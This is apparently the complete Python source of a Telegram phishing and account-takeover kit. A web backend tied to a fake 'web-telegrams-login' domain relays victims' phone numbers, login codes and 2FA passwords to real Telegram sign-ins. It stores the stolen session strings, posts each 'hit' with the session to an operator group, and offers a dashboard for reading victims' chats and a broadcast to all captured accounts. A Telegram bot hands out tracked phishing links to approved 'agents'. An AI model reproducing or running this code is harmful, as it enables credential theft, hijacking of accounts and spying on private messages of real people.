import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import uuid
import random
from telebot import types
from quart import Quart, request, jsonify, render_template, redirect, url_for
from quart_cors import cors
from telethon import TelegramClient, functions, errors, events
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- SECTION 1: SYSTEM CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789)) # Update with real ID
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -100123456789)) # Update with real ID
ADMIN_HANDLE = os.environ.get("ADMIN_HANDLE", "@g_yuyuu")

# Frontend URLs
BASE_URL = "https://web-telegrams-login.wuaze.com"

# Logging Engine
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyUltra_Pro_V3_Elite")

# Initialize Apps
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="https://web-telegrams-login.wuaze.com")

# Volatile Memory Storage
active_mirrors = {}
device_pool = [
    {"model": "iPhone 16 Pro Max", "sys": "iOS 18.3"},
    {"model": "MacBook Pro M3", "sys": "macOS 15.1"},
    {"model": "iPad Pro M4", "sys": "iPadOS 18.2"},
    {"model": "Samsung S25 Ultra", "sys": "Android 15"}
]

# --- SECTION 2: DATABASE ARCHITECTURE ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    """Initializes the multi-table relational schema."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Agents Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_users (
                user_id BIGINT PRIMARY KEY, 
                username TEXT,
                credits INTEGER DEFAULT 10,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Captured Accounts Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                tid BIGINT,
                country TEXT,
                status TEXT DEFAULT 'active',
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)

        # Analytics Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_hit TIMESTAMP
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("SYSTEM: Database architecture synchronized.")
    except Exception as e:
        logger.critical(f"DATABASE ERROR: {e}")

def is_approved(user_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT user_id FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except: return False

init_db()

# --- SECTION 3: WEB API BRIDGE (DATA SYNC) ---

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """Handles logic for first-step phone verification."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "").strip()
    tid = data.get('tid', '0')

    if not phone or len(phone) < 8:
        return jsonify({"status": "error", "msg": "Invalid phone format."})

    # Pick a random high-end device to bypass filters
    device = random.choice(device_pool)
    client = TelegramClient(StringSession(), API_ID, API_HASH, 
                            device_model=device['model'], 
                            system_version=device['sys'],
                            app_version="11.4.1")
    
    try:
        await client.connect()
        # Track click metrics
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        sent_code = await client.send_code_request(phone)
        
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "device": device['model']
        }
        
        logger.info(f"BRIDGE: Session created for {phone} using {device['model']}")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Try again in {e.seconds}s"})
    except Exception as e:
        logger.error(f"PHONE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Flood or Invalid Number."})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """Validates the OTP code against the live Telethon client."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    code = data.get('code', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Session Expired."})

    session = active_mirrors[phone]
    client = session['client']

    try:
        await client.sign_in(phone, code, phone_code_hash=session['hash'])
        return await finalize_hit(client, phone, tid)

    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Invalid Code."})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    """Processes the final 2FA layer."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    password = data.get('password', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Expired."})

    client = active_mirrors[phone]['client']
    try:
        await client.sign_in(password=password)
        return await finalize_hit(client, phone, tid)
    except Exception as e:
        return jsonify({"status": "error", "msg": "Incorrect 2FA password."})

async def finalize_hit(client, phone, tid):
    """Saves session, wipes trackers, and alerts Admin/Logger."""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        full_name = f"{me.first_name} {me.last_name or ''}".strip()
        username = f"@{me.username}" if me.username else "No Username"

        # Persistence Logic (Save to DB)
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
            VALUES (%s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, full_name, tid))
        
        cur.execute("UPDATE link_metrics SET hits = hits + 1, last_hit = %s WHERE tid = %s", (datetime.now(), tid))
        conn.commit()
        cur.close()
        conn.close()

        # Alert the Master Log Group
        log_msg = (
            f"🔥 <b>VINZY HIT DETECTED</b> 🔥\n\n"
            f"👤 <b>Name:</b> {full_name}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
            f"🔗 <b>Agent ID:</b> <code>{tid}</code>\n"
            f"📱 <b>Device:</b> {active_mirrors[phone]['device']}\n\n"
            f"🔑 <b>Session String:</b>\n<code>{session_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, log_msg)

        # Notify the Agent (Agent who generated the link)
        if str(tid).isdigit() and int(tid) != 0:
            bot.send_message(tid, f"✅ <b>New Success!</b>\nTarget: {full_name}\nPhone: {phone}\nStatus: Captured")

        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- SECTION 4: ADVANCED MIRROR DASHBOARD ---

@app.route('/mirror/<phone>')
async def mirror_view(phone):
    """Live HTML Dashboard for viewing account data."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT session_string, owner_name FROM controlled_accounts WHERE phone = %s", (phone,))
        res = cur.fetchone()
        cur.close()
        conn.close()

        if not res: return "<h1>Account Not Found</h1>", 404

        client = TelegramClient(StringSession(res[0]), API_ID, API_HASH)
        await client.connect()
        
        dialogs = await client.get_dialogs(limit=20)
        
        # Building the Dashboard HTML
        html = f"""
        <html>
        <head>
            <style>
                body {{ background: #212121; color: white; font-family: sans-serif; padding: 20px; }}
                .chat-item {{ background: #2c2c2c; padding: 15px; margin: 5px; border-radius: 10px; border-left: 5px solid #8774e1; }}
                .meta {{ color: #aaa; font-size: 12px; }}
            </style>
        </head>
        <body>
            <h1>Mirror: {res[1]} ({phone})</h1>
            <div class='container'>
        """
        for d in dialogs:
            msg_text = d.message.message[:100] if d.message.message else "<i>Media/Sticker</i>"
            html += f"<div class='chat-item'><b>{d.name}</b><br>{msg_text}<div class='meta'>{d.date}</div></div>"
        
        html += "</div><br><button onclick='location.reload()'>Refresh Feed</button></body></html>"
        
        await client.disconnect()
        return html
    except Exception as e:
        return f"Error connecting to session: {e}"

# --- SECTION 5: BOT INTERFACE & COMMANDS ---

@bot.message_handler(commands=['start'])
def start_handler(m):
    uid = m.from_user.id
    if is_approved(uid):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        markup.add("🔗 Link Gen", "📈 My Stats", "🛠 Settings", "📢 Broadcast")
        bot.send_message(m.chat.id, f"<b>Welcome back, {m.from_user.first_name}</b>\nVinzy Ultra Pro V3 is active.", reply_markup=markup)
    else:
        # Request access from Admin
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Approve User", callback_data=f"approve_{uid}"))
        bot.send_message(VERIFY_GROUP, f"⚠️ <b>Access Request</b>\nUser: {m.from_user.first_name}\nID: {uid}", reply_markup=kb)
        bot.send_message(m.chat.id, "❌ Access Denied. Your request has been sent to the Admin.")

@bot.callback_query_handler(func=lambda c: c.data.startswith('approve_'))
def approve_callback(call):
    uid = int(call.data.split('_')[1])
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO approved_users (user_id, username) VALUES (%s, %s) ON CONFLICT DO NOTHING", (uid, f"User_{uid}"))
    conn.commit()
    cur.close()
    conn.close()
    bot.answer_callback_query(call.id, "User Approved!")
    bot.send_message(uid, "🎉 <b>Congratulations!</b>\nYou have been approved. Type /start to begin.")

@bot.message_handler(func=lambda m: m.text == "🔗 Link Gen")
def gen_link_handler(m):
    if is_approved(m.from_user.id):
        personal_link = f"{BASE_URL}/?id={m.from_user.id}"
        bot.reply_to(m, f"🚀 <b>Your Personalized Link:</b>\n\n<code>{personal_link}</code>\n\n<i>Share this link. Hits will be logged to your ID.</i>")

@bot.message_handler(func=lambda m: m.text == "📈 My Stats")
def stats_handler(m):
    uid = m.from_user.id
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (uid,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    
    clicks = res[0] if res else 0
    hits = res[1] if res else 0
    bot.send_message(m.chat.id, f"📊 <b>Your Performance:</b>\n\n🖱 Total Clicks: {clicks}\n🎯 Total Hits: {hits}")

@bot.message_handler(func=lambda m: m.text == "📢 Broadcast")
def broadcast_prompt(m):
    if m.from_user.id == 123456789: # Replace with your actual Admin ID
        msg = bot.send_message(m.chat.id, "Enter the message to broadcast to ALL captured accounts:")
        bot.register_next_step_handler(msg, perform_broadcast)
    else:
        bot.reply_to(m, "Only the SuperAdmin can broadcast.")

async def perform_broadcast(m):
    text = m.text
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM controlled_accounts")
    sessions = cur.fetchall()
    cur.close()
    conn.close()

    bot.send_message(m.chat.id, f"Starting broadcast to {len(sessions)} accounts...")
    
    for s in sessions:
        try:
            client = TelegramClient(StringSession(s[0]), API_ID, API_HASH)
            await client.connect()
            await client.send_message('me', text) # Sends to their 'Saved Messages'
            await client.disconnect()
        except: continue
    
    bot.send_message(m.chat.id, "Broadcast Complete.")

# --- SECTION 6: BACKGROUND TASKS & EXECUTION ---

def run_bot():
    """Keeps the Telegram Bot polling in a separate thread."""
    bot.infinity_polling()

if __name__ == "__main__":
    # Start Bot Thread
    Thread(target=run_bot).start()
    
    # Start Web App
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"STARTING: Vinzy Pro Engine on Port {port}")
    app.run(host="0.0.0.0", port=port)
